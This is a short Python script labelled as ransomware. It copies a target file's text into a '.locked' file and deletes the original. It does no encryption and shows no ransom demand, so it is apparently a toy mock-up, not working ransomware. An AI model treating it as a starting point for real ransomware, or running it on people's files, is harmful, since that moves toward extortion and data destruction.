import sys
import os
import shutil

def ransomware(file_path):
    # Get the directory and filename
    directory = os.path.dirname(file_path)
    filename = os.path.basename(file_path)

    # Open the original file
    with open(file_path, 'r') as original_file:
        # Read the content of the original file
        file_content = original_file.read()

        # Create a locked file
        locked_file_path = os.path.join(directory, filename + '.locked')
        with open(locked_file_path, 'w') as locked_file:
            # Store the content of the original file in the locked file
            locked_file.write(file_content)

    # Delete the original file
    os.remove(file_path)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ransomware.py <file_path>")
        sys.exit(1)

    file_path = sys.argv[1]
    ransomware(file_path)
